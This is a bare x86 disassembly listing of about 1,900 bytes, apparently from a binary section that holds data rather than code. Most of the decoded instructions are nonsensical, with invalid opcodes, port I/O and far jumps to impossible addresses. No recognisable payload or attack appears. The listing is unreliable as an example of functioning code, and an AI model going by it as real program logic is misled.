  41ff72:	mov    al,0x6b
  41ff74:	nop
  41ff75:	inc    ecx
  41ff76:	das    
  41ff77:	pop    eax
  41ff78:	jb     0x41ffe0
  41ff7a:	push   ebx
  41ff7b:	pop    ss
  41ff7c:	popa   
  41ff7d:	lea    eax,[esp+edx*4]
  41ff80:	sub    DWORD PTR [edx-0x7f],edi
  41ff83:	inc    ebp
  41ff84:	data16 loopne 0x41fffb
  41ff87:	cmp    cl,BYTE PTR [edx+ebp*8+0x7]
  41ff8b:	jle    0x42000c
  41ff8d:	mov    bl,BYTE PTR [ecx+0x9]
  41ff90:	dec    ebp
  41ff91:	fs push esp
  41ff93:	sbb    BYTE PTR [esi-0x32],cl
  41ff96:	add    esi,DWORD PTR [eax]
  41ff98:	test   ecx,edi
  41ff9a:	jbe    0x41ff3f
  41ff9c:	jno    0x41ff69
  41ff9e:	ins    BYTE PTR es:[edi],dx
  41ff9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffa0:	or     esp,DWORD PTR [edx+0x3f82d989]
  41ffa6:	sar    DWORD PTR [ebx],1
  41ffa8:	inc    eax
  41ffa9:	iret   
  41ffaa:	in     al,0x93
  41ffac:	test   al,0xd5
  41ffae:	sub    ah,BYTE PTR [ecx]
  41ffb0:	pop    ss
  41ffb1:	in     eax,dx
  41ffb2:	jo     0x41ff9b
  41ffb4:	dec    edi
  41ffb5:	out    dx,eax
  41ffb6:	mov    ebp,0x4c261c39
  41ffbb:	jge    0x41ff72
  41ffbd:	retf   0x67ab
  41ffc0:	cli    
  41ffc1:	leave  
  41ffc2:	push   cs
  41ffc3:	push   esi
  41ffc4:	cmp    cl,BYTE PTR [eax-0x7cc8c71e]
  41ffca:	pop    ax
  41ffcc:	stc    
  41ffcd:	fadd   st,st(6)
  41ffcf:	hlt    
  41ffd0:	jl     0x41ffe8
  41ffd2:	xchg   di,ax
  41ffd4:	cmc    
  41ffd5:	inc    BYTE PTR [esi]
  41ffd7:	sbb    eax,0xbff9aef1
  41ffdc:	mov    ah,BYTE PTR [ebx-0x1e]
  41ffdf:	mov    esp,0x40ca60c3
  41ffe4:	or     BYTE PTR [esi-0x1e080936],dh
  41ffea:	or     BYTE PTR [edi],bl
  41ffec:	stos   BYTE PTR es:[edi],al
  41ffed:	test   dl,bh
  41ffef:	inc    esi
  41fff0:	stc    
  41fff1:	int3   
  41fff2:	xor    al,0x27
  41fff4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fff5:	into   
  41fff6:	jne    0x41ffac
  41fff8:	lds    ecx,FWORD PTR gs:[edx]
  41fffb:	repnz retf 0x1d43
  41ffff:	push   esp
  420000:	je     0x420058
  420002:	xor    ch,BYTE PTR [ebp+0x11]
  420005:	cmp    dl,dl
  420007:	mov    dl,0xa7
  420009:	inc    esi
  42000a:	mov    eax,0x61d6b7fd
  42000f:	and    esi,DWORD PTR [ecx+eax*4+0x4c1ae560]
  420016:	add    BYTE PTR [ebx-0x20],ah
  420019:	xor    cl,BYTE PTR [edi]
  42001b:	xor    edx,DWORD PTR [ecx+0x397ce7a]
  420021:	push   0xffffffc9
  420023:	sbb    eax,0x5d654478
  420028:	jmp    0x420062
  42002a:	or     al,0x96
  42002c:	lahf   
  42002d:	mov    ebp,0x88404bc3
  420032:	dec    eax
  420033:	in     eax,0x54
  420035:	stos   DWORD PTR es:[edi],eax
  420036:	pop    esp
  420037:	jl     0x420045
  420039:	xchg   ebx,eax
  42003a:	mov    al,0x5d
  42003c:	in     eax,0xb9
  42003e:	xchg   ecx,eax
  42003f:	ins    BYTE PTR es:[edi],dx
  420040:	cmp    cl,BYTE PTR [ebx-0x5b]
  420043:	jno    0x420097
  420045:	or     edx,esp
  420047:	fcomp  DWORD PTR ds:0x41374073
  42004d:	xchg   ecx,eax
  42004e:	sbb    DWORD PTR [edi],esi
  420050:	inc    esi
  420051:	repz push ss
  420053:	xor    esp,ecx
  420055:	push   ebx
  420056:	scas   eax,DWORD PTR es:[edi]
  420057:	test   eax,0x370e1ed0
  42005c:	pop    DWORD PTR [esi]
  42005e:	or     cl,cl
  420060:	push   edi
  420061:	mov    BYTE PTR [edx+eax*1-0x30],dh
  420065:	bound  edx,QWORD PTR [edx-0x10]
  420068:	and    BYTE PTR fs:[ebp+0x64c08614],cl
  42006f:	fst    DWORD PTR [edi-0x52c58cd8]
  420075:	ret    0x2897
  420078:	sub    ah,dh
  42007a:	inc    ebx
  42007b:	pop    ecx
  42007c:	and    eax,0x228ef58
  420081:	(bad)  
  420082:	repz fcmovne st,st(1)
  420085:	xchg   ebp,eax
  420086:	cmp    edi,0x6a
  420089:	in     al,0x52
  42008b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42008c:	fwait
  42008d:	and    al,0x8d
  42008f:	pop    esi
  420090:	or     BYTE PTR ss:[eax+0x624ffddb],al
  420097:	iret   
  420098:	push   0x653cc1b1
  42009d:	mov    ecx,0x2b01f830
  4200a2:	fadd   DWORD PTR [eax+0x2e]
  4200a6:	dec    edi
  4200a7:	aaa    
  4200a8:	mov    cl,0x4c
  4200aa:	xchg   ebx,eax
  4200ab:	sahf   
  4200ac:	in     al,dx
  4200ad:	mov    esi,0xacb2ee63
  4200b2:	jp     0x420127
  4200b4:	cld    
  4200b5:	das    
  4200b6:	inc    eax
  4200b7:	cwde   
  4200b8:	out    0xac,al
  4200ba:	fadd   DWORD PTR [ecx-0x36]
  4200bd:	jae    0x4200f2
  4200bf:	or     eax,0x5195a8ce
  4200c4:	sub    edi,0xaee205ac
  4200ca:	js     0x4200da
  4200cc:	and    dh,BYTE PTR [edi+0x20]
  4200cf:	xchg   bl,bh
  4200d1:	ret    
  4200d2:	jmp    0xfd1a5b11
  4200d7:	sbb    eax,0x4b3c3f17
  4200dc:	dec    ebp
  4200dd:	and    dh,BYTE PTR [ecx+0x20e17e74]
  4200e3:	scas   eax,DWORD PTR es:[edi]
  4200e4:	inc    edx
  4200e5:	pop    esp
  4200e6:	es push cs
  4200e8:	dec    edx
  4200e9:	arpl   WORD PTR [ecx],di
  4200eb:	es iret 
  4200ed:	mov    bl,0x42
  4200ef:	(bad)  
  4200f0:	out    dx,al
  4200f1:	out    0x60,al
  4200f3:	push   ecx
  4200f4:	mov    ebx,edi
  4200f6:	jae    0x4200be
  4200f8:	aas    
  4200f9:	repnz dec edx
  4200fb:	call   0x81542679
  420100:	ins    BYTE PTR es:[edi],dx
  420101:	cmp    eax,0xfbee21ea
  420106:	mov    cl,0xb7
  420108:	call   0xa5c025fe
  42010d:	pop    eax
  42010e:	xchg   edi,eax
  42010f:	and    DWORD PTR [ecx-0x75cfd365],esi
  420115:	or     al,0x83
  420117:	stos   DWORD PTR es:[edi],eax
  420118:	jo     0x420190
  42011a:	sub    al,BYTE PTR [ebx-0x21f9dc5c]
  420120:	push   esp
  420121:	call   0xbfb:0x296f6e8d
  420128:	in     eax,dx
  420129:	test   BYTE PTR [esi-0x41ac8c06],0xd0
  420130:	xchg   ecx,eax
  420131:	push   ds
  420132:	xchg   ebp,eax
  420133:	and    DWORD PTR [esi-0x7f],esp
  420136:	sub    al,0x6f
  420138:	mov    ecx,0x774ec808
  42013d:	in     eax,dx
  42013e:	or     ah,BYTE PTR cs:[ecx+0x2438e14b]
  420145:	jmp    0xfa72d2d
  42014a:	mov    cs,esp
  42014c:	shr    DWORD PTR [ebx],0xb3
  42014f:	imul   esp,edi,0x94034fa1
  420155:	mov    WORD PTR [esi+0x48],cs
  420158:	outs   dx,DWORD PTR ds:[esi]
  420159:	cmp    DWORD PTR [esi-0x61],ecx
  42015c:	and    edi,DWORD PTR [ecx-0x27]
  42015f:	mov    ebx,0x2ead3f87
  420164:	das    
  420165:	sub    cl,BYTE PTR [ecx-0x2e342a87]
  42016b:	in     eax,0xe4
  42016d:	aaa    
  42016e:	xor    dl,BYTE PTR [ecx+0x1e]
  420171:	jp     0x4201ab
  420173:	call   0x89799cc7
  420178:	aaa    
  420179:	add    esi,esi
  42017b:	rcr    BYTE PTR [ebx],1
  42017d:	dec    edx
  42017e:	in     eax,dx
  42017f:	mov    edx,DWORD PTR [edi+0x73]
  420182:	mov    gs,WORD PTR [edx+0x27882834]
  420188:	lods   al,BYTE PTR ds:[esi]
  420189:	out    0xa5,al
  42018b:	addr16 mov ecx,0xc13a5212
  420191:	pop    esi
  420192:	das    
  420193:	push   DWORD PTR [ecx+0x78fbffa0]
  420199:	mov    esp,0x914e179d
  42019e:	sbb    al,0x98
  4201a0:	dec    esp
  4201a1:	jb     0x420153
  4201a3:	in     al,dx
  4201a4:	mov    edi,0x39bc2d81
  4201a9:	push   cs
  4201aa:	dec    edi
  4201ab:	push   esi
  4201ac:	jo     0x420162
  4201ae:	loopne 0x420136
  4201b0:	cld    
  4201b1:	cld    
  4201b2:	mov    esp,0x43e3081f
  4201b7:	test   eax,0x48667cc8
  4201bc:	(bad)  
  4201be:	xor    DWORD PTR [edx-0x7483a2cd],0xcb51fe87
  4201c8:	popa   
  4201c9:	fcomp  QWORD PTR [edx]
  4201cb:	inc    esp
  4201cc:	fsub   st(2),st
  4201ce:	stos   DWORD PTR es:[edi],eax
  4201cf:	shr    BYTE PTR [eax+esi*4],0x63
  4201d3:	test   DWORD PTR ds:0x511eb210,esp
  4201d9:	xchg   ecx,eax
  4201da:	mov    bl,0xe9
  4201dc:	add    BYTE PTR [ecx+0x5f],dl
  4201df:	inc    esp
  4201e0:	cmp    al,0xef
  4201e2:	cmc    
  4201e3:	repnz scas al,BYTE PTR es:[edi]
  4201e5:	test   al,0xb4
  4201e7:	out    0x87,eax
  4201e9:	push   edx
  4201ea:	(bad)  
  4201eb:	xor    dh,BYTE PTR [edx]
  4201ed:	std    
  4201ee:	dec    ecx
  4201ef:	jbe    0x420251
  4201f1:	pop    edx
  4201f2:	add    al,0xc8
  4201f4:	cmp    dl,BYTE PTR ds:[ecx]
  4201f7:	pop    ebp
  4201f8:	jnp    0x420245
  4201fa:	mov    ebx,0xf82a43f9
  4201ff:	xchg   ecx,eax
  420200:	int    0x63
  420202:	leave  
  420203:	shl    DWORD PTR [edx+0x4f0cc945],1
  420209:	adc    DWORD PTR [edi],esi
  42020b:	into   
  42020c:	xor    dh,BYTE PTR [eax+0x1c61b856]
  420212:	xor    BYTE PTR [esi-0x62],al
  420215:	loop   0x42020b
  420217:	int    0xd8
  420219:	fst    DWORD PTR [edx+0x48]
  42021c:	push   DWORD PTR fs:[ebp+0x6a]
  420220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420221:	imul   ebp,DWORD PTR [esp+eiz*8],0x4c
  420225:	mov    ah,0xfc
  420227:	pop    ebx
  420228:	in     eax,0xdc
  42022a:	or     BYTE PTR [ebp+0x3e8d1b77],0xf0
  420231:	out    dx,al
  420232:	aaa    
  420233:	lock jae 0x42028b
  420236:	mov    ds:0x1d476c86,eax
  42023b:	sub    esi,DWORD PTR [edi+edx*2+0x1b]
  42023f:	addr16 push es
  420241:	mov    ds:0x2e624be4,eax
  420246:	enter  0x4af3,0x95
  42024a:	sbb    ch,dh
  42024c:	xchg   ecx,eax
  42024d:	xchg   edi,eax
  42024e:	push   0xfffffffe
  420250:	lods   eax,DWORD PTR ds:[esi]
  420251:	sar    BYTE PTR [edi+ebx*1-0x52],0xab
  420256:	xchg   ebx,eax
  420257:	cwde   
  420258:	lods   eax,DWORD PTR ds:[esi]
  420259:	out    dx,eax
  42025a:	inc    ecx
  42025b:	sub    al,0x7b
  42025d:	mov    esp,0xa1580019
  420262:	cwde   
  420263:	call   0xc0f9:0xf3aecbda
  42026a:	lea    esi,[edi]
  42026c:	add    edx,DWORD PTR [ecx]
  42026e:	mov    eax,ds:0x34f6e271
  420273:	or     al,bl
  420275:	pop    ds
  420276:	pop    eax
  420277:	es dec edi
  420279:	lahf   
  42027a:	fst    DWORD PTR [edi-0x142ebd95]
  420280:	cmp    BYTE PTR [edi+eiz*4-0x5c],0xe7
  420285:	scas   al,BYTE PTR es:[edi]
  420286:	mov    eax,ds:0xa7f98a17
  42028b:	out    dx,al
  42028c:	push   ss
  42028d:	cs in  eax,dx
  42028f:	sbb    BYTE PTR [ebx+0x44],bh
  420292:	out    0x65,al
  420294:	call   DWORD PTR ds:0x3be58e3e
  42029a:	dec    ebx
  42029b:	(bad)  
  42029c:	jmp    0x2dc3:0x6c54f8a6
  4202a3:	leave  
  4202a4:	sahf   
  4202a5:	xor    ecx,eax
  4202a7:	test   al,0xd6
  4202a9:	je     0x4202ab
  4202ab:	xchg   edi,eax
  4202ac:	jae    0x42027f
  4202ae:	ror    DWORD PTR [ebx-0x5937edfc],1
  4202b4:	jne    0x4202e0
  4202b6:	jb     0x42027e
  4202b8:	xchg   ebp,eax
  4202b9:	cwde   
  4202ba:	jae    0x4202b6
  4202bc:	jbe    0x4202ed
  4202be:	(bad)  
  4202bf:	fs mov dh,0xc9
  4202c2:	jno    0x42032b
  4202c4:	(bad)  
  4202c5:	stos   DWORD PTR es:[edi],eax
  4202c6:	daa    
  4202c7:	pushf  
  4202c8:	dec    DWORD PTR [edi]
  4202ca:	xchg   bh,cl
  4202cc:	add    al,0x63
  4202ce:	aad    0x2a
  4202d0:	stos   BYTE PTR es:[edi],al
  4202d1:	push   ebx
  4202d2:	dec    esp
  4202d3:	(bad)  
  4202d4:	mov    ecx,0x750f1bf1
  4202d9:	(bad)  
  4202da:	sub    BYTE PTR [eax-0x5d8cc628],dl
  4202e0:	(bad)  
  4202e1:	lock add esp,ebp
  4202e4:	sbb    DWORD PTR [edi+0xbe3ff8a],edx
  4202ea:	xchg   ecx,eax
  4202eb:	push   es
  4202ec:	ja     0x42035e
  4202ee:	push   ds
  4202ef:	ficomp WORD PTR [edi]
  4202f1:	xchg   DWORD PTR [edi-0x7b],esi
  4202f4:	mov    esi,DWORD PTR [ecx+eax*4+0x3196a365]
  4202fb:	dec    esi
  4202fc:	in     eax,0x9
  4202fe:	lahf   
  4202ff:	inc    ebx
  420300:	dec    edx
  420301:	or     eax,0x45e0051b
  420306:	xchg   BYTE PTR [eax],ch
  420308:	inc    eax
  420309:	mov    ebx,esp
  42030b:	xchg   esi,eax
  42030c:	int3   
  42030d:	sahf   
  42030e:	dec    edi
  42030f:	mov    esp,0x9d54fdfb
  420314:	mov    ebx,0xf453db7a
  420319:	sub    DWORD PTR [eax],edi
  42031b:	loope  0x42035c
  42031d:	xchg   edi,eax
  42031e:	aam    0x2d
  420320:	sbb    bh,dh
  420322:	mov    ebx,0x843ff05f
  420327:	outs   dx,BYTE PTR ds:[esi]
  420328:	xor    al,BYTE PTR [edi+0x60aa099a]
  42032e:	addr16 xor al,0xf8
  420331:	out    dx,eax
  420332:	in     al,0x29
  420334:	add    eax,0x51ef1c1d
  420339:	push   esi
  42033a:	sub    cl,BYTE PTR [eax-0x9]
  42033d:	outs   dx,BYTE PTR ds:[esi]
  42033e:	mov    bh,0xc6
  420340:	cs scas al,BYTE PTR es:[edi]
  420342:	gs mov ecx,0x39b093de
  420348:	(bad)  
  420349:	add    esi,ebx
  42034b:	mov    ch,al
  42034d:	adc    eax,ebx
  42034f:	jns    0x420355
  420351:	fldenv [esi+esi*1+0x11cacd6d]
  420358:	in     al,dx
  420359:	sub    al,0xc6
  42035b:	es cwde 
  42035d:	jae    0x42034d
  42035f:	cmc    
  420360:	(bad)  
  420361:	fwait
  420362:	mov    dl,0xaf
  420364:	inc    esp
  420365:	(bad)  
  420366:	lods   al,BYTE PTR ds:[esi]
  420367:	jmp    0xa129:0x994ccf9a
  42036e:	fcom   DWORD PTR [edx*8-0x763ca1f3]
  420375:	jp     0x420321
  420377:	test   BYTE PTR [esp+ebx*1-0x3a],0x25
  42037c:	dec    edi
  42037d:	das    
  42037e:	push   ds
  42037f:	or     al,0x45
  420381:	outs   dx,BYTE PTR ds:[esi]
  420382:	retf   
  420383:	in     eax,dx
  420384:	push   ecx
  420385:	xchg   ebp,eax
  420386:	ret    0x35ae
  420389:	mov    edx,0x3a148fd7
  42038e:	lods   eax,DWORD PTR ds:[esi]
  42038f:	rcl    BYTE PTR [ecx],cl
  420391:	shl    ecx,1
  420393:	sub    ecx,DWORD PTR [edx+ecx*1]
  420396:	dec    edx
  420397:	inc    ebx
  420398:	mov    BYTE PTR [ebx],al
  42039a:	out    dx,al
  42039b:	pusha  
  42039c:	sbb    ecx,DWORD PTR ds:0xf4db4803
  4203a2:	leave  
  4203a3:	ret    
  4203a4:	mov    al,ds:0xdfb78578
  4203a9:	fst    QWORD PTR [ebp-0x3e]
  4203ac:	lods   al,BYTE PTR ds:[esi]
  4203ad:	scas   eax,DWORD PTR es:[edi]
  4203ae:	ror    dl,1
  4203b0:	aad    0xad
  4203b2:	mov    ecx,0x782fb4bf
  4203b7:	jle    0x420364
  4203b9:	inc    esp
  4203ba:	scas   al,BYTE PTR es:[edi]
  4203bb:	clc    
  4203bc:	push   ebp
  4203bd:	call   0xd8628a3c
  4203c2:	ret    0x9a94
  4203c5:	cmp    DWORD PTR [edi],edi
  4203c7:	mov    esi,0x919896d0
  4203cc:	inc    esi
  4203cd:	ja     0x42035e
  4203cf:	inc    edx
  4203d0:	aas    
  4203d1:	lock xchg ebx,ecx
  4203d4:	in     al,dx
  4203d5:	mov    ebx,0xe1becbbb
  4203da:	add    dh,BYTE PTR [edx]
  4203dc:	sub    DWORD PTR [ebp+0x12],esp
  4203df:	fst    DWORD PTR [eax-0x33]
  4203e2:	mov    dl,0xcc
  4203e4:	inc    edx
  4203e5:	aad    0x58
  4203e7:	sbb    DWORD PTR [edi+0x534a95d4],edx
  4203ed:	fsubr  st(6),st
  4203ef:	out    dx,eax
  4203f0:	xor    ebp,DWORD PTR [edi+0x4c]
  4203f3:	jg     0x420444
  4203f5:	mov    BYTE PTR [esi-0x291c6a60],dh
  4203fb:	sub    ah,bl
  4203fd:	pop    ebx
  4203fe:	push   0xfffffffe
  420400:	jg     0x420481
  420402:	jnp    0x420469
  420404:	mov    ds:0x40d75558,al
  420409:	adc    BYTE PTR [eax],cl
  42040b:	test   al,bh
  42040d:	pop    esi
  42040e:	outs   dx,DWORD PTR ds:[esi]
  42040f:	pop    ecx
  420410:	xor    BYTE PTR [ecx],0x4b
  420413:	or     ebp,ecx
  420415:	lods   eax,DWORD PTR ds:[esi]
  420416:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420417:	adc    al,0xc1
  420419:	jecxz  0x420479
  42041b:	mov    BYTE PTR [eax-0x70ddafff],dh
  420421:	mov    ds:0x84d75ece,al
  420426:	cmp    al,0xb6
  420428:	fwait
  420429:	push   ds
  42042a:	pop    ebp
  42042b:	adc    DWORD PTR [edx+0x72],esp
  42042e:	ss cmp al,0x8a
  420431:	jp     0x4203b7
  420433:	xchg   esi,eax
  420434:	pusha  
  420435:	sub    BYTE PTR [edi+0x1a],0x8f
  420439:	sbb    BYTE PTR [eax],0x8c
  42043c:	jmp    0xe446b36b
  420441:	mov    cl,0xfa
  420443:	add    al,0x8e
  420445:	jge    0x4203e4
  420447:	mov    dl,0xf0
  420449:	pop    ebp
  42044a:	in     eax,dx
  42044b:	test   DWORD PTR [ebx-0xddc0226],esp
  420451:	outs   dx,BYTE PTR ds:[esi]
  420452:	clc    
  420453:	sbb    esp,eax
  420455:	ret    0xa00d
  420458:	mov    dh,0xce
  42045a:	pop    ds
  42045b:	call   0x4ddcb6f3
  420460:	xor    eax,0xdb488e00
  420465:	int    0xce
  420467:	div    bh
  420469:	jl     0x420474
  42046b:	xchg   edi,eax
  42046c:	jge    0x420461
  42046e:	mov    ebx,0x24a8a46f
  420473:	jge    0x420477
  420475:	mov    edx,0x6ff91031
  42047a:	and    al,0x20
  42047c:	cs add bl,ah
  42047f:	xchg   edi,eax
  420480:	fsubr  QWORD PTR [ebx+0x18]
  420483:	inc    edx
  420484:	mov    ebx,0xd822c0c6
  420489:	inc    esp
  42048a:	and    ebp,DWORD PTR [eax]
  42048c:	mov    eax,0x699097c4
  420491:	xchg   esi,eax
  420492:	out    0x71,eax
  420494:	xor    eax,0x7818e1f0
  420499:	fmul   st(6),st
  42049b:	sub    al,0x7e
  42049d:	pop    edx
  42049e:	mov    ebp,eax
  4204a0:	lea    edi,[eax]
  4204a2:	rcr    BYTE PTR [esi],cl
  4204a4:	dec    ecx
  4204a5:	jmp    FWORD PTR [edi+0x18]
  4204a8:	popf   
  4204a9:	xchg   esi,eax
  4204aa:	pop    edx
  4204ab:	cmp    ebp,DWORD PTR [ecx]
  4204ad:	mov    dl,0xdc
  4204af:	cmp    al,0xe0
  4204b1:	dec    ebp
  4204b2:	dec    ebp
  4204b3:	jno    0x420457
  4204b5:	sbb    al,0x36
  4204b7:	sbb    ah,ah
  4204b9:	ror    DWORD PTR [esi],cl
  4204bb:	in     eax,0x6c
  4204bd:	sub    dl,BYTE PTR [esi+0x1a4a1dd3]
  4204c3:	jecxz  0x42053f
  4204c5:	clc    
  4204c6:	sti    
  4204c7:	adc    eax,ebx
  4204c9:	sbb    DWORD PTR ds:[ecx],ebp
  4204cc:	lea    edi,[edi+0x59]
  4204cf:	push   esi
  4204d0:	adc    BYTE PTR ds:0xc56d7b16,dh
  4204d6:	push   ss
  4204d7:	xor    DWORD PTR [edi+0x52],edi
  4204da:	xchg   esp,eax
  4204db:	fcom   QWORD PTR [ecx+0x6c7e62f5]
  4204e1:	hlt    
  4204e2:	loop   0x4204ea
  4204e4:	jbe    0x4204a6
  4204e6:	lock js 0x4204e5
  4204e9:	jg     0x4204a8
  4204eb:	ds je  0x4204e9
  4204ee:	sahf   
  4204ef:	push   edi
  4204f0:	clc    
  4204f1:	retf   0x270c
  4204f4:	adc    BYTE PTR [ebx],cl
  4204f6:	cli    
  4204f7:	add    ebx,edi
  4204f9:	sbb    dl,0xc6
  4204fc:	mov    WORD PTR [eax-0x3e],?
  4204ff:	je     0x420541
  420501:	push   edi
  420502:	push   ecx
  420503:	mov    esi,0xd35fedea
  420508:	sub    al,0xea
  42050a:	out    0xaf,al
  42050c:	ret    0x6878
  42050f:	test   eax,0x5e027e4b
  420514:	jp     0x4204bf
  420516:	dec    eax
  420517:	shl    DWORD PTR [ecx-0x10],1
  42051a:	aaa    
  42051b:	idiv   DWORD PTR [eax]
  42051d:	jmp    0x420519
  42051f:	ret    0x74e4
  420522:	dec    edi
  420523:	repnz add DWORD PTR [ebp-0x1561abad],ebp
  42052a:	pop    ebx
  42052b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42052c:	loope  0x42054f
  42052e:	into   
  42052f:	outs   dx,DWORD PTR ds:[esi]
  420530:	(bad)  
  420531:	jge    0x42052f
  420533:	jp     0x420558
  420535:	mov    si,di
  420538:	push   ds
  420539:	imul   ebx,DWORD PTR [ebx],0xb7a22fed
  42053f:	push   ecx
  420540:	pop    edi
  420541:	mov    ds:0x9ff24ea0,eax
  420546:	fcmovbe st,st(0)
  420548:	iret   
  420549:	sub    DWORD PTR [ebx+0x155704b6],eax
  42054f:	jno    0x42059b
  420551:	sbb    ebx,DWORD PTR [ecx]
  420553:	mov    ch,BYTE PTR [edi-0x732121c6]
  420559:	adc    al,0x83
  42055b:	data16 add al,0xc
  42055e:	mov    al,ds:0xa15b1a1
  420563:	ret    
  420564:	mov    esi,0xc682b318
  420569:	ja     0x42053a
  42056b:	xchg   ebx,eax
  42056c:	(bad)  
  42056d:	and    al,0xce
  42056f:	jnp    0x4205c2
  420571:	mov    esp,0x9a40219e
  420576:	pop    ebx
  420577:	mov    ah,0x88
  420579:	popa   
  42057a:	nop
  42057b:	and    al,0x47
  42057d:	jo     0x42054a
  42057f:	(bad)
  420582:	jmp    0x420524
  420584:	arpl   WORD PTR [ebx+0x1be32e52],si
  42058a:	ja     0x42054f
  42058c:	fsub   st,st(1)
  42058e:	aam    0x98
  420590:	mov    ds:0x1b02a955,al
  420595:	xchg   ebp,eax
  420596:	or     al,0xe4
  420598:	push   edi
  420599:	data16 fst QWORD PTR [eax]
  42059c:	mov    ds:0xcfa699fe,al
  4205a1:	call   0xf31262c3
  4205a6:	fwait
  4205a7:	and    ah,BYTE PTR [ecx+eiz*8]
  4205aa:	ror    DWORD PTR gs:[esp+esi*8],cl
  4205ae:	xlat   BYTE PTR ds:[ebx]
  4205af:	fdiv   DWORD PTR [eax]
  4205b1:	sub    al,0xe5
  4205b3:	(bad)  
  4205b5:	add    al,0x41
  4205b7:	jo     0x420544
  4205b9:	enter  0xab2e,0x5a
  4205bd:	imul   edi,DWORD PTR es:[eax-0x6f1328b7],0x4c
  4205c5:	enter  0xddcd,0xfa
  4205c9:	add    DWORD PTR [ebx+eax*4],0x506754af
  4205d0:	xor    al,0x86
  4205d2:	daa    
  4205d3:	xchg   edi,eax
  4205d4:	sbb    ecx,DWORD PTR [esi]
  4205d6:	jns    0x4205fb
  4205d8:	out    0xb1,eax
  4205da:	cld    
  4205db:	std    
  4205dc:	inc    esp
  4205dd:	outs   dx,BYTE PTR ds:[esi]
  4205de:	loope  0x420570
  4205e0:	imul   ebx,DWORD PTR [edx+0x6c87c982],0xffffff9c
  4205e7:	and    dl,BYTE PTR [ebp-0x24]
  4205ea:	cli    
  4205eb:	cmp    esi,DWORD PTR gs:[ebx-0x68]
  4205ef:	test   DWORD PTR [esi-0x69],edx
  4205f2:	std    
  4205f3:	ficom  DWORD PTR [ebx]
  4205f5:	arpl   dx,bx
  4205f7:	mov    ds:0x754735fb,eax
  4205fc:	rcr    BYTE PTR [edi+esi*1-0x1d163216],1
  420603:	push   esi
  420604:	retf   
  420605:	xor    al,0x42
  420607:	data16 fwait
  420609:	push   cs
  42060a:	add    BYTE PTR [edx+0x2c1cbd70],ah
  420610:	inc    esp
  420611:	pop    ebp
  420612:	or     DWORD PTR [ecx+0x6f1e6915],0xffffffb4
  420619:	xchg   ebp,eax
  42061a:	and    eax,0xd23e9b16
  42061f:	adc    BYTE PTR [ebp-0x38],ch
  420622:	add    eax,0xceac0b18
  420627:	loopne 0x4205e4
  420629:	pop    ecx
  42062a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42062b:	mov    ch,0x5e
  42062d:	out    dx,al
  42062e:	aas    
  42062f:	inc    ecx
  420630:	pushf  
  420631:	inc    eax
  420632:	and    BYTE PTR [eax-0x38f37632],dh
  420638:	dec    edi
  420639:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42063a:	in     eax,dx
  42063b:	and    al,0x8d
  42063d:	pop    ecx
  42063e:	popa   
  42063f:	adc    BYTE PTR [ecx-0x4b02c561],bh
  420645:	popa   
  420646:	in     eax,dx
  420647:	mov    BYTE PTR [esi+0x39],bh
  42064a:	mov    eax,ds:0x61aea7cf
  42064f:	push   ebx
  420650:	(bad)  
  420651:	loope  0x420676
  420653:	or     al,0x87
  420655:	arpl   WORD PTR [eax+edi*4],bx
  420658:	ja     0x42068f
  42065a:	(bad)  
  42065b:	jnp    0x420629
  42065d:	add    al,0xeb
  42065f:	lods   al,BYTE PTR ds:[esi]
  420660:	jo     0x420618
  420662:	xchg   edi,eax
  420663:	pusha  
  420664:	mov    eax,ds:0xcd725264
  420669:	pop    edi
  42066a:	jo     0x420668
  42066c:	dec    edx
  42066d:	retf   
  42066e:	mov    eax,ds:0xe34cbbf4
  420673:	(bad)  
  420674:	js     0x420639
  420676:	push   es
  420677:	mov    esi,0xe652ee46
  42067c:	outs   dx,BYTE PTR ds:[esi]
  42067d:	jg     0x42062d
  42067f:	loop   0x420647
  420681:	push   edi
  420682:	daa    
  420683:	and    DWORD PTR [esi],esp
  420685:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420686:	or     BYTE PTR [edx],cl
  420688:	icebp  
  420689:	arpl   WORD PTR [eax+0xc],bp
  42068c:	xchg   WORD PTR [eax+ebp*4+0x71],di
  420691:	push   0xeb1ba8df
  420696:	in     al,dx
  420697:	adc    DWORD PTR [eax+esi*1],ebp
  42069a:	addr16 cmp edi,esi
  42069d:	cld    
  42069e:	repz cmp eax,0x593b1ea4
  4206a4:	icebp  
  4206a5:	xor    edx,DWORD PTR [ebx+0x76c143f9]
  4206ab:	(bad)  
  4206ac:	add    al,0xf7
  4206ae:	inc    edx
  4206af:	add    dh,BYTE PTR [eax-0x2bce5904]
  4206b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206b6:	adc    al,0x13
  4206b8:	inc    ecx
  4206b9:	aam    0x66
  4206bb:	test   eax,0xef61a225
  4206c0:	mov    esi,0x9b515f0f
  4206c5:	jge    0x420731
  4206c7:	jmp    0xad2c:0x5dd4f4b5
  4206ce:	call   0x5b77:0xd1f16670
  4206d5:	sub    BYTE PTR [esi+0x72ad7914],al
  4206db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4206dc:	mov    al,0xc6
  4206de:	push   ecx
  4206df:	jno    0x42066e
  4206e1:	into   
  4206e2:	push   0xffffffa0
  4206e4:	cmp    esi,esi
  4206e6:	adc    al,dh
  4206e8:	out    dx,al
  4206e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206ea:	imul   edx,DWORD PTR [edi+0x7b],0xffffffe2
  4206ee:	(bad)  
  4206ef:	xlat   BYTE PTR ds:[ebx]
  4206f0:	mov    BYTE PTR [eax+0x7],bh
  4206f3:	aam    0xbc
  4206f5:	add    eax,0xe382daa1
  4206fa:	cmp    al,0x2a
  4206fc:	or     cl,al
  4206fe:	lar    eax,WORD PTR [edx-0x6a094a9f]
  420705:	add    ebp,DWORD PTR [eax+0xb798140]
  42070b:	adc    BYTE PTR [esi-0x9d0c625],ch
  420711:	inc    esi
  420712:	xor    eax,0x1d2f1844
  420717:	enter  0x21ff,0xd0
  42071b:	es jecxz 0x4206b2
